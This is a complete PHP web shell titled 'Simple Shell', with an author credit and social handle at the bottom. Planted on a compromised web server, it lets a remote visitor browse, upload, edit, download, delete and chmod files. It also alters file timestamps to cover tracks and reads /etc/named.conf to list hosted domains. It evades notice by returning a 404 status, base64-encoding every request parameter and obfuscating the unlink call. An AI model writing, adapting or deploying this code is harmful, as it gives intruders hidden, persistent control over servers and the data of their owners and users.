<?php
ini_set("display_errors", 1);
ini_set("display_startup_errors", 1);
error_reporting(0);
http_response_code(404);
function e($s)
{
    return base64_encode($s);
}
function d($s)
{
    return base64_decode($s);
}
if (isset($_GET["info"]) && $_GET["info"] === "info") {
    phpinfo();
    exit();
}
foreach ($_GET as $k => $v) {
    $_GET[$k] = d($v);
}
foreach ($_POST as $k => $v) {
    $_POST[$k] = d($v);
}
$dir = realpath(isset($_GET["dir"]) ? $_GET["dir"] : __DIR__);
$dir = $dir ? $dir : __DIR__;
chdir($dir);
$edir = "dir=" . e($dir);
if (isset($_GET["dl"])) {
    if (!realpath($_GET["dl"])) {
        exit();
    }
    header("Content-Description: File Transfer");
    header("Content-Type: application/octet-stream");
    header(
        'Content-Disposition: attachment; filename="' .
            basename($_POST["dl"]) .
            '"'
    );
    readfile($_GET["dl"]);
    exit();
}
function size($path, $decimals = 0)
{
    $bytes = filesize($path);
    $factor = floor((strlen($bytes) - 1) / 3);
    if ($factor > 0) {
        $sz = "KMGT";
    }
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) .
        @$sz[$factor - 1] .
        "B";
}
function perms($path)
{
    clearstatcache();
    $perms = fileperms($path);
    $x = [
        "U",
        "p",
        "c",
        "U",
        "d",
        "U",
        "b",
        "U",
        "r",
        "U",
        "l",
        "U",
        "s",
        "U",
        "U",
        "U",
    ];
    $info =
        $x[$perms >> 12] .
        implode(
            "",
            array_map(
                function ($b, $m) {
                    return $b == "1" ? $m : "-";
                },
                str_split(decbin($perms & 0xfff) . ""),
                str_split("rwxrwxrwx")
            )
        );
    return $info . " " . substr(sprintf("%o", @fileperms($path)), -4);
}
if (!function_exists("posix_getpwuid") && !extension_loaded("posix")) {
    function posix_getpwuid($x)
    {
        return ["name" => "---"];
    }
}
?><!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=0.5, user-scalable=yes"><title>Simple Shell</title><style>html,body,input,button{background:black;color:gray;font-family:monospace;}a{color:gray;text-decoration: none;}button,input{border:1px solid gray;height:1.7em;}table{width:100%;border:1px dotted gray;border-spacing:0px;}tr:hover{background:#161616;}td,th{padding:2px 0px;border:1px solid #666;}textarea{width:80%;height:50vh;background:black;color:green;tab-size:4;}.btn{border: 1px solid #666;border-radius:0.3em;padding:0 0.3em;display:inline-block;text-align:center;}.btn:hover{border-color:white;background-color:black;transition: background-color 0.2s linear;}.directory{background:#444654;}.directory:before{content:"DIR/";color:gray;}.file{background:#343641;}.file:before{content:"-";color:gray;}.notwritable a, .notwritable{color:#FF7800;}.writable a, .writable{color:#49FF00;}.symlink{float:right;color:#E2C275;}.icon{font-size:1.5em;padding:0.1em 0.2em;margin:0px;}.delete:before{content:"\1F6AE";opacity:0.7;}.rename:before{content:"\270D";color:blue;}.download:before{content:"\2193\2193";color:green;}.openlink:before{content:"\1F517";}.success{color:yellow;}.success:before{content:"\270C";}.failed{color:red;}.failed:before{content:"\2622";}</style><script>function e(s){return btoa(s);}function chmod(i,old){var n=prompt("CHMOD:",old);if(n){i.href+="&new="+e(n);return true;}return false;}function chtime(i,old){var n=prompt("Change modified time:",old);if(n){i.href+="&new="+e(n);return true;}return false;}function rename(i,old){var n=prompt("Rename:",old);if(n){i.href+="&new="+e(n);return true;}return false;}</script></head><body>YOUR IP: <?php echo $_SERVER[
    "REMOTE_ADDR"
]; ?><br/>SERVER IP: <?php echo gethostbyname($_SERVER["HTTP_HOST"]) .
    " / " .
    $_SERVER[
        "SERVER_NAME"
    ]; ?></br>
    <?php function symlinkDomain($dom){$d0mains=@file("/etc/named.conf",false);if(!$d0mains){$dom="<font color=red size=3px>Cant Read [ /etc/named.conf ]</font>";$GLOBALS["need_to_update_header"]="true";}else{$count=0;foreach($d0mains as $d0main){if(@strstr($d0main,"zone")){preg_match_all('#zone "(.*)"#',$d0main,$domains);flush();if(strlen(trim($domains[1][0]))>2){flush();$count++;}}}$dom="$count Domain";}return $dom;} ?>
    DOMAIN ON SERVER : <?= symlinkDomain($dom)?> <br>
    <a class="btn" href="?info=info" target="__blank">SERVER INFO</a>: <?php echo php_uname(); ?></br><form action="?<?php echo $edir; ?>" method="post" enctype="multipart/form-data"><input type="file" name="file" class="<?php echo is_writable(
    $dir
)
    ? "writable"
    : "notwritable"; ?>"><button type="submit">Upload</button></form><center><?php
if (isset($_FILES["file"])) {
    if (
        move_uploaded_file(
            $_FILES["file"]["tmp_name"],
            basename($_FILES["file"]["name"])
        )
    ) {
        echo '<span class="success">UPLOAD SUCCESS!</span>';
    } else {
        echo '<span class="failed">UPLOAD FAILED!</span>';
    }
}
if (isset($_GET["file"])) {
    if (isset($_POST["edit"])) {
        if (@file_put_contents($_GET["file"], $_POST["edit"])) {
            echo '<span class="success">EDIT SUCCESS!</span>';
        } else {
            echo '<span class="failed">EDIT FAILED!</span>';
        }
    }
    echo '<form action="?file=' .
        e($_GET["file"]) .
        "&" .
        $edir .
        '" method="post" onsubmit="edit.value=e(edit.value)"><textarea id="edit" name="edit">' .
        htmlspecialchars(
            file_get_contents($_GET["file"]),
            ENT_QUOTES | ENT_SUBSTITUTE | ENT_COMPAT,
            "UTF-8"
        ) .
        "</textarea><button>Update</button></form>";
}
if (isset($_GET["delete"])) {
    $x = str_replace("X", "", "XuXnXlXiXnXkX");
    if ($x($_GET["delete"])) {
        echo '<span class="success">DELETE SUCCESS!</span>';
    } else {
        echo '<span class="failed">DELETE FAILED!</span>';
    }
}
if (isset($_GET["chmod"], $_GET["new"])) {
    if (chmod($_GET["chmod"], intval($_GET["new"], 8))) {
        echo '<span class="success">CHMOD SUCCESS!</span>';
    } else {
        echo '<span class="failed">CHMOD FAILED!</span>';
    }
}
if (isset($_GET["chtime"], $_GET["new"])) {
    if (touch($_GET["chtime"], intval(strtotime($_GET["new"])))) {
        echo '<span class="success">TIME MACHINE SUCCESS!</span>';
    } else {
        echo '<span class="failed">TIME MACHINE FAILED!</span>';
    }
}
if (isset($_GET["rename"], $_GET["new"])) {
    if (rename($_GET["rename"], $dir . "/" . basename($_GET["new"]))) {
        echo '<span class="success">RENAME SUCCESS!</span>';
    } else {
        echo '<span class="failed">RENAME FAILED!</span>';
    }
}
$dirs = [];
$files = [];
foreach (scandir($dir) as $p) {
    if (is_dir($dir . "/" . $p)) {
        if ($p != ".") {
            $dirs[] = $dir . "/" . $p;
        }
    } else {
        $files[] = $dir . "/" . $p;
    }
}
?></center>
<form onsubmit="dir.value=e(dir.value)">Directory: <input style="width: 500px;" class="<?php echo is_writable(
    $dir
)
    ? "writable"
    : "notwritable"; ?>" type="text" id="dir" name="dir" value="<?php echo $dir; ?>"><button>GO</button><a href="?dir=<?php echo e(
    realpath($_SERVER["DOCUMENT_ROOT"])
); ?>">[Root Path]</a><a href="?dir=<?php echo e(
    realpath(__DIR__)
); ?>">[Shell Path]</a></form>
<table><tr><th></th><th>SIZE</th><th>Modified Date</th><th>PERMS</th><th>ACTION</th></tr><?php foreach (
    array_merge($dirs, $files)
    as $path
) {

    $d = is_dir($path);
    $w = is_writable($path);
    ?><tr><td class="<?php echo ($d ? "directory" : "file") .
    " " .
    ($w ? "writable" : "notwritable"); ?>"><a href="?<?php echo $d
    ? "dir=" . e($path) . ""
    : "file=" . e($path) . "&" . $edir; ?>"><?php echo htmlspecialchars(
    basename($path)
); ?></a><?php echo is_link($path)
    ? '<span class="symlink">' . readlink($path) . "</span>"
    : ""; ?></td><td><?php echo $d
    ? "---"
    : size($path); ?></td><td><a class="btn" href="?chtime=<?php echo e($path) .
    "&" .
    $edir; ?>" onclick="return chtime(this,'<?php
$chtime = date("M-d-Y H:i:s", filemtime($path));
echo $chtime;
?>')"><?php echo $chtime; ?></a></td><td><a class="btn" href="?chmod=<?php echo e($path) .
    "&" .
    $edir; ?>" onclick="return chmod(this,'<?php echo substr(
    sprintf("%o", @fileperms($path)),
    -4
); ?>');"><?php echo perms($path); ?></a></td><td><?php
if (
    basename($path) !== ".."
) { ?><a title="Delete" class="btn icon delete" href="?delete=<?php echo e(
    $path
) .
    "&" .
    $edir; ?>" onclick="return confirm('Sure to delete?')"></a><a title="Rename" class="btn icon rename" href="?rename=<?php echo e(
    $path
) .
    "&" .
    $edir; ?>" onclick="return rename(this,'<?php echo basename(
    $path
); ?>')"></a><?php if (!$d) {
    echo '<a title="Download" class="btn icon download" href="?dl=' .
        e($path) .
        '"></a>';
}}
?></td></tr><?php
} ?></table>
Modified By KAKEGURAI :: <a href="https://instagram.com/kakegurai_">IG : @kakegurai_</a> - <a href="#"></a></body></html>